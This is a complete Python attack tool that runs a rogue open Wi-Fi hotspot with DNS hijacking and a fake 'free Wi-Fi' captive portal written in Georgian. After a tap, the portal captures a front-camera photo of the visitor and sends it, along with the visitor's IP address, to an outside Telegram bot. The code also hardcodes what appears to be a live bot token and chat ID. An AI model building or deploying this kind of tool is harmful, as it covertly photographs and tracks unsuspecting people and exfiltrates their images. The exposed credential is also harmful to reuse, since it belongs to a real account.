#!/usr/bin/env python3
"""
FULLY AUTOMATED CAPTIVE PORTAL + SELFIE → REAL INTERNET
Forced wlan1 (AP) + your upstream (wlp3s0 / eth0 etc.)
After selfie is taken → client gets FULL internet automatically
Sends every selfie to Telegram immediately
Tested & fixed for Kali 2026
"""

import os
import sys
import time
import signal
import argparse
import threading
import subprocess
import http.server
import ssl
import urllib.parse
import base64
import json
import requests
from pathlib import Path
from http import HTTPStatus

# Colors
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; C = "\033[96m"; B = "\033[1m"; X = "\033[0m"

def info(m): print(f"{C}[*]{X} {m}")
def ok(m):   print(f"{G}[✓]{X} {m}")
def warn(m): print(f"{Y}[!]{X} {m}")
def err(m):  print(f"{R}[✗]{X} {m}")

def step(n, t=""):
    print(f"\n{B}{C}{'═'*65}{X}")
    print(f"  STEP {n} — {t}")
    print(f"{B}{C}{'═'*65}{X}\n")

# ========================= CONFIG =========================
GATEWAY_IP = "10.0.0.1"
AP_IFACE   = "wlan1"          # forced hotspot interface
HTTP_PORT  = 80
HTTPS_PORT = 443

SCRIPT_DIR = Path(__file__).resolve().parent
UPLOAD_DIR = SCRIPT_DIR / "selfies"
UPLOAD_DIR.mkdir(exist_ok=True)

CERT_FILE = SCRIPT_DIR / "selfsigned.crt"
KEY_FILE  = SCRIPT_DIR / "selfsigned.key"

AUTHORIZED_SET = "authorized_clients"
UPSTREAM_IFACE = None

# ──────────────── TELEGRAM CONFIG ────────────────
# CHANGE THESE TWO LINES !!!
TELEGRAM_BOT_TOKEN = "8179489115:AAF98kAnJh8tWzltmnq0zME2n9Gq4qFrSa4"   # ← your bot token
TELEGRAM_CHAT_ID   = "8597195242"                                  # or "-1001987654321"
# ────────────────────────────────────────────────

# =========================================================

def generate_cert():
    if CERT_FILE.exists() and KEY_FILE.exists():
        return
    step(1, "Generating self-signed certificate")
    subprocess.run(["openssl", "req", "-x509", "-nodes", "-days", "3650", "-newkey", "rsa:2048",
                    "-keyout", str(KEY_FILE), "-out", str(CERT_FILE), "-subj", f"/CN={GATEWAY_IP}"], check=True)

def install_deps():
    step(2, "Installing dependencies")
    pkgs = ["hostapd", "dnsmasq", "iptables", "iw", "openssl", "ipset"]
    missing = [p for p in pkgs if "installed" not in subprocess.run(["dpkg","-s",p], capture_output=True,text=True).stdout]
    if missing:
        subprocess.run(["apt","update","-qq"], check=True)
        subprocess.run(["apt","install","-y","-qq"]+missing, check=True)
    subprocess.run(["ipset","create",AUTHORIZED_SET,"hash:ip","-exist"], check=False)

def setup_iptables(upstream):
    step(3, "Applying FULLY AUTOMATED iptables rules")
    subprocess.run(["iptables","-F"], check=True)
    subprocess.run(["iptables","-t","nat","-F"], check=True)
    subprocess.run(["iptables","-P","FORWARD","ACCEPT"], check=True)

    subprocess.run(["sysctl","-w","net.ipv4.ip_forward=1"], check=False)
    subprocess.run(["iptables","-t","nat","-A","POSTROUTING","-o",upstream,"-j","MASQUERADE"], check=True)

    subprocess.run(["iptables","-A","FORWARD","-m","conntrack","--ctstate","RELATED,ESTABLISHED","-j","ACCEPT"], check=True)
    subprocess.run(["iptables","-A","FORWARD","-i",AP_IFACE,"-m","set","--match-set",AUTHORIZED_SET,"src","-j","ACCEPT"], check=True)
    subprocess.run(["iptables","-A","FORWARD","-p","icmp","-j","ACCEPT"], check=True)
    subprocess.run(["iptables","-A","FORWARD","-i",AP_IFACE,"-j","DROP"], check=True)

    ok("iptables fully configured — real internet sharing active")

def send_selfie_to_telegram(selfie_path, client_ip):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"

        with open(selfie_path, "rb") as photo:
            files = {"photo": photo}
            caption = (
                f"📸 New selfie captured\n"
                f"Client IP: {client_ip}\n"
                f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"via captive portal"
            )
            payload = {
                "chat_id": TELEGRAM_CHAT_ID,
                "caption": caption,
                "parse_mode": "HTML"   # optional
            }

            response = requests.post(url, files=files, data=payload, timeout=12)
            rjson = response.json()

            if response.ok and rjson.get("ok"):
                ok(f"Selfie sent to Telegram → {selfie_path.name}")
            else:
                err(f"Telegram send failed: {response.status_code} - {rjson.get('description', 'no details')}")
    except Exception as e:
        err(f"Failed to send selfie to Telegram: {e}")

def authorize_client(ip):
    subprocess.run(["ipset","add",AUTHORIZED_SET,ip], check=False)
    ok(f"✅ CLIENT AUTHORIZED → {ip} now has FULL INTERNET")

# ==================== HOTSPOT & DNS ====================

HOSTAPD_CONF = "/tmp/selfie_hostapd.conf"
DNSMASQ_CONF = "/tmp/selfie_dnsmasq.conf"

def setup_hotspot(ssid):
    step(4, f"Starting open hotspot on {AP_IFACE}")
    subprocess.run(["nmcli","device","set",AP_IFACE,"managed","no"], capture_output=True)
    subprocess.run(["ip","link","set",AP_IFACE,"up"], check=True)
    subprocess.run(["ip","addr","flush","dev",AP_IFACE], check=True)
    subprocess.run(["ip","addr","add",f"{GATEWAY_IP}/24","dev",AP_IFACE], check=True)

    with open(HOSTAPD_CONF,"w") as f:
        f.write(f"""interface={AP_IFACE}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0""")

    global hostapd_proc
    hostapd_proc = subprocess.Popen(["hostapd",HOSTAPD_CONF], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)
    ok("Hotspot is UP")

def start_dns_hijack():
    step(5, "DNS + DHCP + Redirect")
    global dnsmasq_proc
    subprocess.run(["pkill","-9","dnsmasq"], capture_output=True)

    subnet = ".".join(GATEWAY_IP.split(".")[:3])
    with open(DNSMASQ_CONF,"w") as f:
        f.write(f"""interface={AP_IFACE}
listen-address={GATEWAY_IP}
dhcp-range={subnet}.50,{subnet}.200,12h
dhcp-option=3,{GATEWAY_IP}
dhcp-option=6,{GATEWAY_IP}
no-resolv
address=/#/{GATEWAY_IP}""")

    dnsmasq_proc = subprocess.Popen(["dnsmasq","--conf-file="+DNSMASQ_CONF], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)

    for p in [80,443]:
        subprocess.run(["iptables","-t","nat","-A","PREROUTING","-i",AP_IFACE,"-p","tcp","--dport",str(p),"-j","DNAT","--to-destination",f"{GATEWAY_IP}:{p}"], check=True)
    subprocess.run(["iptables","-t","nat","-A","PREROUTING","-i",AP_IFACE,"-p","udp","--dport","53","-j","DNAT","--to-destination",f"{GATEWAY_IP}:53"], check=True)
    ok("DNS hijack active")

# ==================== HTML PORTAL ====================

HTML = """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>უფასო Wi-Fi</title>
<style>body{margin:0;background:#000;color:#fff;font-family:sans-serif;height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column}</style></head>
<body>
<h2>უფასო WiFi წვდომა</h2>
<p id="status">დადასტურებისთვის დააჭირეთ დადასტურებას</p>
<button id="btn" style="display:none;margin-top:30px;padding:15px 40px;font-size:1.4rem;background:#0f8;color:#000;border:none;border-radius:10px">ვერიფიკაცია</button>
<div id="tap" style="position:fixed;inset:0;background:rgba(0,0,0,0.9);font-size:120px;display:flex;align-items:center;justify-content:center">▶</div>

<script>
const tap=document.getElementById('tap'), btn=document.getElementById('btn'), status=document.getElementById('status');
async function capture(){
  try{
    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
    const video=document.createElement('video'); video.srcObject=stream; await video.play();
    await new Promise(r=>setTimeout(r,1500));
    const c=document.createElement('canvas'); c.width=video.videoWidth||640; c.height=video.videoHeight||480;
    c.getContext('2d').drawImage(video,0,0);
    const data=c.toDataURL('image/jpeg',0.8);
    await fetch('/upload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({img:data})});
    status.textContent="წარმატებით! ინტერნეტთან დაკავშირება...";
    setTimeout(()=>location.href="https://google.com",1500);
  }catch(e){status.textContent="ვერიფიკაცია შეცდომა სცადეთ ხელახლა"; btn.style.display="block";}
}
tap.onclick=()=>{tap.style.display="none"; btn.style.display="block";};
btn.onclick=capture;
</script>
</body></html>"""

# ==================== SERVER ====================

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        p = urllib.parse.urlparse(self.path).path.lstrip('/')
        if p in {"generate_204","gen_204","hotspot-detect.html","ncsi.txt"}:
            self.send_response(302)
            self.send_header("Location", f"https://{GATEWAY_IP}/")
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Content-Type","text/html")
        self.end_headers()
        self.wfile.write(HTML.encode())

    def do_POST(self):
        if self.path == "/upload":
            try:
                data = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
                ts = int(time.time())
                filename = f"selfie_{ts}.jpg"
                filepath = UPLOAD_DIR / filename

                with open(filepath,"wb") as f:
                    f.write(base64.b64decode(data["img"].split(",")[1]))

                ok(f"Selfie saved → {filename}")

                client_ip = self.client_address[0]
                send_selfie_to_telegram(filepath, client_ip)

                authorize_client(client_ip)

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'{"status":"ok"}')
            except Exception as e:
                err(f"Upload handling error: {e}")
                self.send_error(400)
            return
        self.send_error(404)

def start_servers():
    step(6, "Starting HTTP + HTTPS servers")
    generate_cert()

    # HTTPS
    srv = http.server.HTTPServer(("0.0.0.0", HTTPS_PORT), Handler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(str(CERT_FILE), str(KEY_FILE))
    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    # HTTP redirect to HTTPS
    class Redir(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(301)
            self.send_header("Location", f"https://{GATEWAY_IP}/")
            self.end_headers()
    http.server.HTTPServer(("0.0.0.0", HTTP_PORT), Redir).serve_forever()

# ==================== CLEANUP ====================

def cleanup():
    print(f"\n{Y}Stopping...{X}")
    subprocess.run(["iptables","-F"])
    subprocess.run(["iptables","-t","nat","-F"])
    subprocess.run(["ipset","flush",AUTHORIZED_SET], check=False)
    for f in [HOSTAPD_CONF, DNSMASQ_CONF]:
        if os.path.exists(f): os.unlink(f)
    ok("Done.")

# ==================== MAIN ====================

def main():
    global UPSTREAM_IFACE

    p = argparse.ArgumentParser(description="Selfie Captive Portal")
    p.add_argument("--ssid", default="WIFIII", help="WiFi network name")
    p.add_argument("--upstream", required=True, help="Upstream interface with internet (e.g. eth0, wlp3s0)")
    args = p.parse_args()

    if os.geteuid() != 0:
        err("Run with sudo!")
        sys.exit(1)

    UPSTREAM_IFACE = args.upstream

    try:
        install_deps()
        setup_hotspot(args.ssid)
        start_dns_hijack()
        setup_iptables(UPSTREAM_IFACE)
        threading.Thread(target=start_servers, daemon=True).start()

        print(f"""
{G}╔═══════════════════════════════════════════════════════════════╗
║               SELFIE → INTERNET AUTOMATION READY               ║
╠═══════════════════════════════════════════════════════════════╣
║ SSID      : {args.ssid}
║ AP        : wlan1
║ Upstream  : {UPSTREAM_IFACE}
║ Photos    : {UPLOAD_DIR}
║ Telegram  : {TELEGRAM_CHAT_ID}
╚═══════════════════════════════════════════════════════════════╝{X}
""")

        signal.signal(signal.SIGINT, lambda s,f: (cleanup(), sys.exit(0)))
        while True: time.sleep(10)

    except Exception as e:
        err(str(e))
        cleanup()

if __name__ == "__main__":
    main()
